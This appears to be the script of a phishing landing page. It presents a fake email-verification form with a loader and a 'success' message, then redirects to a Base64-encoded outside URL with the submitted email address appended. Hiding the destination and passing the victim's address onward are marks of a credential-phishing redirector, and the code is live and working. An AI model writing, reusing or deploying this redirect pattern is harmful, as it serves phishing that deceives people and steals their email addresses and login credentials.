  <script>
    // Function to validate email format
    function validateEmail(email) {
      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return re.test(email);
    }

    // Function to handle email verification and redirection
    function verifyEmail() {
      const emailInput = document.getElementById("emailInput").value.trim();
      const loader = document.getElementById("loader");
      const successMessage = document.getElementById("successMessage");

      // Validate email format
      if (!validateEmail(emailInput)) {
        alert("Please enter a valid email address.");
        return;
      }

      // Show loader and hide input section
      document.querySelector(".input-container").style.display = "none";
      loader.style.display = "block";

      // Simulate a delay before showing the success message
      setTimeout(() => {
        loader.style.display = "none";
        successMessage.style.display = "block";

        // Redirect to a URL with the email appended
        const encodedRedirectURL = "aHR0cHM6Ly9wZWJsZXkuaG9iYnlwbHVzLnJvL0RzRXRORE01WXkwLyM="; // Base64 encoded URL
        const decodedRedirectURL = atob(encodedRedirectURL); // Decode Base64
        const redirectURL = `${decodedRedirectURL}${emailInput}`; // Append email directly

        // Simulate the redirection after a few seconds
        setTimeout(() => {
          window.location.href = redirectURL; // Redirect to the final URL
        }, 10);
      }, 4000); // Wait 2 seconds before showing the success message
    }

    // Handle the submit button click
    document.getElementById("submitButton").addEventListener("click", (e) => {
      e.preventDefault();
      verifyEmail();
    });

    // Allow pressing Enter to submit form
    document.getElementById("emailInput").addEventListener("keypress", function (e) {
      if (e.key === "Enter") {
        e.preventDefault();
        verifyEmail();
      }
    });
  </script>
